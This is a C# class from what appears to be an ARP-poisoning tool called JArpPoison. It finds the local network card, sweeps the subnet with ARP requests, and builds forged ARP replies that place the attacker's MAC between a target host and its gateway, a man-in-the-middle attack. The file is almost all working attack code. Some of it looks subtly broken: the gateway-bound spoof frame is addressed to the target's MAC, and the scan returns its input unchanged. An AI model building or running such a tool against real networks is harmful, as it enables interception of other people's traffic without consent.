using JARP;
using JARP.Classes;
using JARP.Helpers;
using JArpPoison.Classes;
using JArpPoison.Helpers;
using PacketDotNet;
using SharpPcap;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Windows.Forms;

namespace JArpPoison.Classes
{  
    public class JArper
    {
        public JCaptureDevice GatherNetworkDeviceInfo()
        {
            CaptureDeviceList devices = CaptureDeviceHelpers.FindCaptureDevices();

            foreach (var dev in devices)
            {
                string deviceDescription = dev.ToString().Replace(" ", "");

                string deviceIpAddress = NetworkRegularExpressions.GetIpAddressString(deviceDescription);

                //Select the NIC
                if (IPHelpers.IpIsInOurSubnet(deviceIpAddress))
                {
                    string macAddress = NetworkRegularExpressions.GetMatchString(deviceDescription);

                    JCaptureDevice jDev = new JCaptureDevice
                    {
                        CaptureDevice = dev,
                        OurIpAddress = IPHelpers.GetIpAddress(deviceDescription),
                        GatewayIpAddess = IPHelpers.GetGatewayIp(deviceDescription),
                        SubnetMask = IPHelpers.GetNetMask(deviceDescription),
                        OurMacAddress = new PhysicalAddress(macAddress.Split(':').Select(x => Convert.ToByte(x, 16)).ToArray())
                    };

                    return jDev;
                }
            }

            return null;
        }

        public bool ValidateTargets(IWin32Window owner, string ipTxtBoxTxt, string macTxtBoxTxt, JCaptureDevice device)
        {
            if (string.IsNullOrEmpty(ipTxtBoxTxt) || string.IsNullOrEmpty(macTxtBoxTxt))
            {
                MessageBox.Show(owner, "Please enter values into both IP and MAC text boxes before sending JArps", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
            else if (ipTxtBoxTxt.Equals(device.OurIpAddress.ToString()) || macTxtBoxTxt.Equals(device.OurMacAddress.ToString()))
            {
                MessageBox.Show(owner, "Don't target your own device.The values shown are supposed to be an example\n\nScan for targets first", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            return true;
        }

        public List<Target> ScanSubnet(ICaptureDevice dev, List<string> cleanIps, List<Target> macsResponding, PhysicalAddress ourMac, IPAddress ourIp)
        {
            foreach (string ip in cleanIps)
            {
                string[] ipArray = ip.Split('.');

                IPAddress targetIp = new IPAddress((uint)IPAddress.NetworkToHostOrder((int)IPAddress.Parse(ipArray[3] + "." + ipArray[2] + "." + ipArray[1] + "." + ipArray[0]).Address));

                EthernetPacket ethernetPacket = CreateRequestArpPacket(dev, ourMac, ourIp, targetIp, PhysicalAddress.Parse("FFFFFFFFFFFF"));

                dev.SendPacket(ethernetPacket);
            }

            return macsResponding;
        }

        public EthernetPacket CreateRequestArpPacket(ICaptureDevice dev, PhysicalAddress srcMac, IPAddress srcIp, IPAddress targetIp, PhysicalAddress trgtMac)
        {
            var ethernetPacket = new EthernetPacket(srcMac, trgtMac, EthernetPacketType.Arp);

            var arpPacket = new ARPPacket(PacketDotNet.ARPOperation.Request, trgtMac, targetIp, srcMac, srcIp);

            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }

        public List<EthernetPacket> CreateResponseArpPackets(ICaptureDevice dev, PhysicalAddress srcMac, PhysicalAddress trgtMac, IPAddress targetIp, IPAddress gatewayIp)
        {
            var targetEthernetPacket = new EthernetPacket(srcMac, trgtMac, EthernetPacketType.Arp);
            //Tell arg 3 that 5 is at 4
            var targetArpPacket = new ARPPacket(ARPOperation.Response, trgtMac, targetIp, srcMac, gatewayIp);

            var gatewayEthernetPacket = new EthernetPacket(srcMac, trgtMac, EthernetPacketType.Arp);
            //And reverse, Switch targets (args 3 & 5)
            var gatewayArpPacket = new ARPPacket(ARPOperation.Response, trgtMac, gatewayIp, srcMac, targetIp);

            targetEthernetPacket.PayloadPacket = targetArpPacket;
            gatewayEthernetPacket.PayloadPacket = gatewayArpPacket;

            return new List<EthernetPacket>
            {
                targetEthernetPacket, gatewayEthernetPacket
            };
        }


    }
}
